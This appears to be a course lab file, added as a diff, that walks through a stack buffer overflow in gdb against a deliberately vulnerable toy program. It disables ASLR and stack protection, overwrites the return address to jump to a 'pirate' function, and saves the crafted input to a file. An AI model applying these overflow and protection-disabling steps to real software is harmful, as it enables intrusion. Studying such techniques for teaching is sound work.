@@ -1,0 +1,220 @@
+# -----------------------------------------------
+# Crafting an attack by buffer overflow
+# -----------------------------------------------
+# Disable ASLR protection for the current session
+# Note: this creates a security risk for the current login session!!!
+#  echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
+# 
+# Enable ASLR again
+#  echo 1 | sudo tee /proc/sys/kernel/randomize_va_space
+#
+# Compile helloFakedReturn.c with additional gcc options:
+# TODO
+#   -Wno-array-bounds -fno-stack-protector -fomit-frame-pointer
+
+gdbtui -q bin/helloFakedReturn
+
+
+(gdb)
+
+break main
+break get_name
+run
+
+   │43      int main() {                                                          │
+B+>│44              char *name=NULL;                                              │
+   │45              printf("ASLR test: main is at %p\n", &main);                  │
+   │46              name = get_name();                                            │
+   │47              if (name != NULL){                                            │
+   │48                      printf("\nHello %s\n", name);                         │
+   │49                      free(name);                                           │
+   │50              }                                                             │
+   │51              return 0;                                                     │
+   │52      }                                                                     │
+
+# change layout to assembler
+
+layout asm
+winheight asm 15
+
+# Leave TUI mode
+# Ctrl-x then a
+
+(gdb) disassemble main
+Dump of assembler code for function main:
+   0x0040069d <+0>:	lea    0x4(%esp),%ecx
+   0x004006a1 <+4>:	and    $0xfffffff0,%esp
+   ...
+   0x004006b4 <+23>:	add    $0x1914,%ebx
+=> 0x004006ba <+29>:	movl   $0x0,-0xc(%ebp)
+   0x004006c1 <+36>:	sub    $0x8,%esp
+   0x004006c4 <+39>:	lea    -0x192b(%ebx),%eax
+   ...
+   0x004006d7 <+58>:	add    $0x10,%esp
+   0x004006da <+61>:	call   0x400657 <get_name>
+   0x004006df <+66>:	mov    %eax,-0xc(%ebp)
+   0x004006e2 <+69>:	cmpl   $0x0,-0xc(%ebp)
+   ...
+   0x00400719 <+124>:	ret
+End of assembler dump.
+
+# Enter TUI mode again
+# Ctrl-x then a
+
+
+# Behold!
+# Return address from the fake is not the normal return address from get_name
+#   0x004006df
+# but the address of the command retq (assembler command #21)
+#   0x00400719
+
+(gdb) p/x $sp
+$1 = 0xbffff070
+
+# print portion of the stack
+
+(gdb) x/64xb $sp
+0xbffff070: 0x01 0x00 0x00 0x00 0x34 0xf1 0xff 0xbf
+0xbffff078: 0x3c 0xf1 0xff 0xbf 0x41 0x07 0x40 0x00
+0xbffff080: 0xa0 0xf0 0xff 0xbf 0x00 0x00 0x00 0x00
+0xbffff088: 0x00 0x00 0x00 0x00 0x81 0x3e 0xdf 0xb7 saved fp caller of main
+0xbffff090: 0x00 0x30 0xfb 0xb7 0x00 0x30 0xfb 0xb7 ret add to caller of main
+0xbffff098: 0x00 0x00 0x00 0x00 0x81 0x3e 0xdf 0xb7
+0xbffff0a0: 0x01 0x00 0x00 0x00 0x34 0xf1 0xff 0xbf
+0xbffff0a8: 0x3c 0xf1 0xff 0xbf 0xc4 0xf0 0xff 0xbf
+
+(gdb) cont
+
+   ┌──────────────────────────────────────────────────────────────────────────┐
+B+>│0x400657 <get_name>     push   %ebx                                       │
+   │0x400658 <get_name+1>   sub    $0x18,%esp                                 │
+   │0x40065b <get_name+4>   call   0x4004e0 <__x86.get_pc_thunk.bx>           │
+   │0x400660 <get_name+9>   add    $0x1968,%ebx                               │
+   │0x400666 <get_name+15>  sub    $0xc,%esp                                  │
+   │0x400669 <get_name+18>  lea    -0x1810(%ebx),%eax                         │
+   │0x40066f <get_name+24>  push   %eax                                       │
+   │0x400670 <get_name+25>  call   0x400430 <printf@plt>                      │
+   │0x400675 <get_name+30>  add    $0x10,%esp                                 │
+   │0x400678 <get_name+33>  sub    $0xc,%esp                                  │
+   │0x40067b <get_name+36>  lea    0xd(%esp),%eax                             │
+   │0x40067f <get_name+40>  push   %eax                                       │
+   │0x400680 <get_name+41>  call   0x400605 <gets_unsave>                     │
+
+# 3 * next
+# Enter name: Peter
+
+Please insert your surname (15 characters max): Peter
+
+   │0x400685 <get_name+46>  add    $0x10,%esp                                 │
+  >│0x400688 <get_name+49>  sub    $0xc,%esp                                  │
+   │0x40068b <get_name+52>  lea    0xd(%esp),%eax                             │
+   │0x40068f <get_name+56>  push   %eax                                       │
+   │0x400690 <get_name+57>  call   0x400450 <strdup@plt>                      │
+   │0x400695 <get_name+62>  add    $0x10,%esp                                 │
+   │0x400698 <get_name+65>  add    $0x18,%esp                                 │
+   │0x40069b <get_name+68>  pop    %ebx                                       │
+   │0x40069c <get_name+69>  ret                                               │
+
+# Inspect the buffer filled with String "Peter"
+
+(gdb) x/72xb $sp
+0xbffff050:  0x00 0x50 0x65 0x74 0x65 0x72 0x00 0xb7 buf starts at 0xbffff051
+0xbffff058:  0xd5 0xc2 0xe2 0xb7 0xd7 0x06 0x40 0x00
+0xbffff060:  0xe9 0x07 0x40 0x00 0x9d 0x06 0x40 0x00
+0xbffff068:  0xc8 0x1f 0x40 0x00 0xdf 0x06 0x40 0x00 snd word: ret addr to main
+0xbffff070:  0x01 0x00 0x00 0x00 0x34 0xf1 0xff 0xbf
+0xbffff078:  0x3c 0xf1 0xff 0xbf 0x00 0x00 0x00 0x00
+0xbffff080:  0xa0 0xf0 0xff 0xbf 0x00 0x00 0x00 0x00
+0xbffff088:  0x00 0x00 0x00 0x00 0x81 0x3e 0xdf 0xb7 
+0xbffff090:  0x00 0x30 0xfb 0xb7 0x00 0x30 0xfb 0xb7 fst word: ret addr to caller of main
+
+# different format
+(gdb) x/20xw $sp
+0xbffff050:     0x74655000      0xb7007265      0xb7e2c2d5      0x004006d7
+0xbffff060:     0x004007e9      0x0040069d      0x00401fc8      0x004006df <-
+0xbffff070:     0x00000001      0xbffff134      0xbffff13c      0x00000000
+0xbffff080:     0xbffff0a0      0x00000000      0x00000000      0xb7df3e81
+0xbffff090:     0xb7fb3000 <-   0xb7fb3000      0x00000000      0xb7df3e81
+
+# Now, hack the stack 
+
+# Set some helpers
+
+print $arch_size = 4
+print $size_of_buf = 15
+print $addr_pirate = &pirate
+print $faked_ret_main = 0x00400719
+print $offset_ret_to_main = $size_of_buf + 3*$arch_size
+print $ret_addr_caller_main = *((unsigned int*) (buf+$offset_ret_to_main+36))
+
+# Write into the stack
+# Fill the entire Buffer with 14 'A' characters and terminate the string
+
+set *(char [15] *) &buf = "AAAAAAAAAAAAAA"
+
+# Replace correct return address to main by start address of function pirate()
+
+print *((unsigned int*) (buf+$offset_ret_to_main)) = $addr_pirate
+
+# Implant the faked return address to main, which implements the
+# return from function pirate
+
+print *((unsigned int*) (buf+$offset_ret_to_main+4)) = $faked_ret_main
+
+# Move the return address to the function that called main,
+# which implements the return from function main()
+
+print *((unsigned int*) (buf+$offset_ret_to_main+8)) = $ret_addr_caller_main
+
+(gdb) x/72xb $sp
+
+0xbffff050:   0x00  0x41  0x41  0x41  0x41  0x41  0x41  0x41 buf starts at 0xbffff051
+0xbffff058:   0x41  0x41  0x41  0x41  0x41  0x41  0x41  0x00
+0xbffff060:   0xe9  0x07  0x40  0x00  0x9d  0x06  0x40  0x00
+0xbffff068:   0xc8  0x1f  0x40  0x00  0xdd  0x05  0x40  0x00 faked 'ret' to pirate()
+0xbffff070:   0x19  0x07  0x40  0x00  0x00  0x30  0xfb  0xb7 faked ret to main; ret to caller of main 
+0xbffff078:   0x3c  0xf1  0xff  0xbf  0x00  0x00  0x00  0x00
+0xbffff080:   0xa0  0xf0  0xff  0xbf  0x00  0x00  0x00  0x00
+0xbffff088:   0x00  0x00  0x00  0x00  0x81  0x3e  0xdf  0xb7
+0xbffff090:   0x00  0x30  0xfb  0xb7  0x00  0x30  0xfb  0xb7
+
+# different format
+
+(gdb) x/20xw $sp
+0xbffff050:     0x41414100      0x41414141      0x41414141      0x00414141
+0xbffff060:     0x004007e9      0x0040069d      0x00401fc8      0x004005dd
+0xbffff070:     0x00400719      0xb7fb3000      0xbffff13c      0x00000000
+0xbffff080:     0xbffff0a0      0x00000000      0x00000000      0xb7df3e81
+0xbffff090:     0xb7fb3000      0xb7fb3000      0x00000000      0xb7df3e81
+
+# Write the faked memory into a file in binary format
+
+dump binary memory ./fakeinput &buf buf+$offset_ret_to_main+8+4
+
+# The hack works upto return from main.
+# Continue
+
+(gdb) cont
+
+# Then we get
+
+Program received signal SIGSEGV, Segmentation fault.
+0xb7fb3000 in _GLOBAL_OFFSET_TABLE_ () from /lib/i386-linux-gnu/libc.so.6
+
+We don't care
+
+#------------
+# If we fix the start address of main by disabling ASLR
+# we are able to use our hack from the command line as well
+#
+# Otherwise, we would get a 'Segmentation fault: 11'
+# since our faked return addresses are not correct.
+
+cat fakeinput | bin/helloFakedReturn
+
+#> output
+
+ASLR test: main is at 0x40069d
+Please insert your surname (15 characters max): You have been hacked!
+Speicherzugriffsfehler (Speicherabzug geschrieben)
+
